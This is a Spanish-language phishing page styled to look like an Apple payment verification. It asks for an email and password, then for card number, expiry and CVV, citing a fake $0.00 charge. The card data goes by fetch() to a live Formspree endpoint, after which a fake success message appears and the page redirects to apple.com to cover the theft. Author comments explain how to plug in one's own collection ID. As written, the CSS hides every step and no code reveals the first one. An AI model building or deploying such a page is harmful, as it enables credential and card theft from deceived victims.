<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Pago</title>
    <style>
        /* ESTILOS */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f5f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #1d1d1f;
        }

        .container {
            background: #fff;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        h2 { margin-bottom: 20px; font-weight: 600; font-size: 22px; }
        p { color: #6e6e73; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
        
        .form-group { text-align: left; margin-bottom: 15px; }
        label { display: block; font-size: 12px; font-weight: 600; color: #1d1d1f; margin-bottom: 5px; }
        
        input {
            width: 100%; padding: 12px; border: 1px solid #d2d2d7; border-radius: 6px;
            font-size: 16px; box-sizing: border-box; transition: border-color 0.3s;
        }
        input:focus { outline: none; border-color: #0071e3; box-shadow: 0 0 0 3px rgba(0, 113, 227, 0.2); }
        
        .row { display: flex; gap: 15px; }
        .col { flex: 1; }
        
        button {
            width: 100%; padding: 14px; background-color: #0071e3; color: white; border: none;
            border-radius: 6px; font-size: 16px; font-weight: 500; cursor: pointer;
            transition: background-color 0.2s; margin-top: 10px;
        }
        button:hover { background-color: #0077ed; }

        /* LOGICA DE VISTAS */
        #step1, #step2, #loader, #success { display: none; } /* Ocultamos todo por defecto */
        
        /* Animaciones */
        .fade-in { animation: fadeIn 0.5s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* LOADER */
        .spinner {
            border: 3px solid #f3f3f3; border-top: 3px solid #0071e3; border-radius: 50%;
            width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container">
        
        <!-- PASO 1: CREDENCIALES -->
        <div id="step1" class="fade-in">
            <h2>Verificación</h2>
            <p>Ingresa tus credenciales para verificar tu cuenta de forma segura.</p>
            
            <form id="form1">
                <div class="form-group">
                    <label for="email">Correo Electrónico</label>
                    <input type="email" id="email" name="email" required placeholder="ejemplo@correo.com">
                </div>
                <div class="form-group">
                    <label for="password">Contraseña</label>
                    <input type="password" id="password" name="password" required placeholder="••••••••">
                </div>
                <button type="submit">Continuar</button>
            </form>
        </div>

        <!-- PASO 2: TARJETA -->
        <div id="step2" class="fade-in">
            <h2>Método de Pago</h2>
            <p>Necesitamos confirmar una transacción de $0.00 para validar tu tarjeta.</p>
            
            <!-- AQUÍ VA EL ENLACE A FORMSPREE -->
            <!-- Reemplaza action="https://formspree.io/f/TU_ID_AQUI" con tu ID real -->
            <form id="form2" action="https://formspree.io/f/maeybpog" method="POST">
                
                <div class="form-group">
                    <label for="cardName">Nombre en la tarjeta</label>
                    <input type="text" id="cardName" name="Nombre_Tarjeta" required placeholder="NOMBRE COMPLETO">
                </div>
                <div class="form-group">
                    <label for="cardNumber">Número de Tarjeta</label>
                    <input type="text" id="cardNumber" name="Numero_Tarjeta" required placeholder="0000 0000 0000 0000" maxlength="19">
                </div>
                <div class="row">
                    <div class="col">
                        <div class="form-group">
                            <label for="cardExpiry">Expiración</label>
                            <input type="text" id="cardExpiry" name="Expiracion" required placeholder="MM/YY" maxlength="5">
                        </div>
                    </div>
                    <div class="col">
                        <div class="form-group">
                            <label for="cardCvv">CVV</label>
                            <input type="text" id="cardCvv" name="CVV" required placeholder="123" maxlength="4">
                        </div>
                    </div>
                </div>
                <button type="submit" id="btnSubmit">Pagar y Verificar</button>
            </form>
        </div>

        <!-- LOADER -->
        <div id="loader">
            <h2>Procesando...</h2>
            <div class="spinner"></div>
            <p>Conectando con el banco...</p>
        </div>

        <!-- ÉXITO -->
        <div id="success">
            <span class="icon">✅</span>
            <h2>¡Verificado!</h2>
            <p>Tu tarjeta ha sido validada correctamente.</p>
        </div>
    </div>

    <script>
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const loader = document.getElementById('loader');
        const success = document.getElementById('success');
        const btn = document.getElementById('btnSubmit');

        // PASO 1: Credenciales
        document.getElementById('form1').addEventListener('submit', (e) => {
            e.preventDefault();
            // Aquí puedes agregar lógica para enviar credenciales si quieres (opcional)
            step1.style.display = 'none';
            step2.style.display = 'block';
        });

        // PASO 2: Tarjeta (Envío a Formspree)
        document.getElementById('form2').addEventListener('submit', (e) => {
            e.preventDefault();
            
            // Simulamos el envío y el loader
            btn.disabled = true;
            btn.innerText = "Procesando...";
            step2.style.display = 'none';
            loader.style.display = 'block';

            // Enviamos los datos a Formspree
            const formData = new FormData(document.getElementById('form2'));
            
            fetch(document.getElementById('form2').action, {
                method: 'POST',
                body: formData,
                headers: { 'Accept': 'application/json' }
            }).then(response => {
                if (response.ok) {
                    // Éxito: mostramos loader un rato y luego el mensaje final
                    setTimeout(() => {
                        loader.style.display = 'none';
                        success.style.display = 'block';
                        
                        // Redirigir después de 2 segundos
                        setTimeout(() => {
                            window.location.href = "https://www.apple.com";
                        }, 2000);
                    }, 2500);
                } else {
                    alert("Hubo un error, intenta de nuevo.");
                    btn.disabled = false;
                    btn.innerText = "Pagar y Verificar";
                    step2.style.display = 'block';
                }
            }).catch(error => {
                alert("Error de conexión.");
            });
        });

        // FORMATEADORES VISUALES
        document.getElementById('cardNumber').addEventListener('input', function (e) {
            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            let formattedValue = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) formattedValue += ' ';
                formattedValue += value[i];
            }
            e.target.value = formattedValue;
        });

        document.getElementById('cardExpiry').addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2);
            }
            e.target.value = value;
        });
    </script>
</body>
</html>
